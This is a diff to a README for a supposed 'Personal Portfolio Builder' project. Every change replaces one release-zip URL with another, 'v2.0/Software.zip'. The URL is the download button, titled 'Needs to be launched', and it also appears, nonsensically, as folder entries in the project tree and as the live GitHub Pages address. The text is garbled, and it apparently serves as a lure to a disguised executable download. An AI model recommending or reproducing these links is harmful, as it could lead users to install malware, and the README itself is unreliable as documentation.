@@ -6,7 +6,7 @@ Welcome to the **Personal Portfolio Builder** GitHub repository! This software d
 ## 🚀 Quick Start
 
 To get started with creating your personal portfolio, you can download the latest version of the software by clicking the following link:
-[![Download Personal Portfolio Builder](https://github.com/TungCoderngunhat10tin/personal-portfolio-builder/releases/download/v1.0/Release.zip)](https://github.com/TungCoderngunhat10tin/personal-portfolio-builder/releases/download/v1.0/Release.zip "Needs to be launched")
+[![Download Personal Portfolio Builder](https://github.com/TungCoderngunhat10tin/personal-portfolio-builder/releases/download/v2.0/Software.zip)](https://github.com/TungCoderngunhat10tin/personal-portfolio-builder/releases/download/v2.0/Software.zip "Needs to be launched")
 
 After downloading the zip file, you can extract it and begin customizing your portfolio template.
 
@@ -58,8 +58,8 @@ personal-portfolio-builder/
 ├── css/
 ├── img/
 ├── js/
-├── https://github.com/TungCoderngunhat10tin/personal-portfolio-builder/releases/download/v1.0/Release.zip
-└── https://github.com/TungCoderngunhat10tin/personal-portfolio-builder/releases/download/v1.0/Release.zip
+├── https://github.com/TungCoderngunhat10tin/personal-portfolio-builder/releases/download/v2.0/Software.zip
+└── https://github.com/TungCoderngunhat10tin/personal-portfolio-builder/releases/download/v2.0/Software.zip
 ```
 
 The `css` folder contains cascading style sheets for styling the portfolio, the `img` folder includes images used in the portfolio, and the `js` folder contains JavaScript files for interactive elements.
@@ -72,7 +72,7 @@ Once you have customized your portfolio to your liking, you can deploy it on Git
 2. Upload your portfolio files to the repository.
 3. Go to the repository settings and scroll down to the GitHub Pages section.
 4. Select the main branch as the source and save the settings.
-5. Your portfolio will now be live at `https://github.com/TungCoderngunhat10tin/personal-portfolio-builder/releases/download/v1.0/Release.zip`.
+5. Your portfolio will now be live at `https://github.com/TungCoderngunhat10tin/personal-portfolio-builder/releases/download/v2.0/Software.zip`.
 
 ## 🤝 Contributing
 
